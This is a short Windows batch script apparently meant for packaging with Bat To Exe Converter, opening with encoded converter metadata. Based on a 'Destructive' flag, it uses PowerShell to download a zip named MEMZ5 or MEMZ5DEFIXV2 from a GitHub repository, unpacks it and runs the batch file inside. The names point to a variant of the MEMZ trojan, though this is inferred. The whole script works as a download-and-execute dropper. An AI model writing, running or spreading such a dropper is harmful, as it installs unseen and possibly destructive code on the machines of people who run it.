::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAjk
::fBw5plQjdCyDJGyX8VAjFAxHRAWQAE+1EbsQ5+n//Nasu0JQYPcnNb/Tz66HL+5ey1X0eZ8um1RVjM4cDR8WdxGkDg==
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSDk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFAxHRAWQAE+1EbsQ5+n//NaJrVkYROM7eo7PlLGWJYA=
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
set Destructive=false

if %Destructive% ==true goto DS
if %Destructive% ==false goto NODS
goto NODS
:DS
echo r u ok
pause 
powershell -c "Invoke-WebRequest -Uri 'https://github.com/zv800/mel/blob/main/MEMZ5DEFIXV2.zip?raw=true' -OutFile 'temp.zip'"
md temp
powershell -c Expand-Archive -Force temp.zip temp\
start temp\MEMZ5DE.bat
exit

:NODS
echo r u ok nods
pause 

powershell -c "Invoke-WebRequest -Uri 'https://github.com/zv800/mel/blob/main/MEMZ5.zip?raw=true' -OutFile 'temp.zip'"
md temp
powershell -c Expand-Archive -Force temp.zip temp\
start temp\MEMZ5.bat

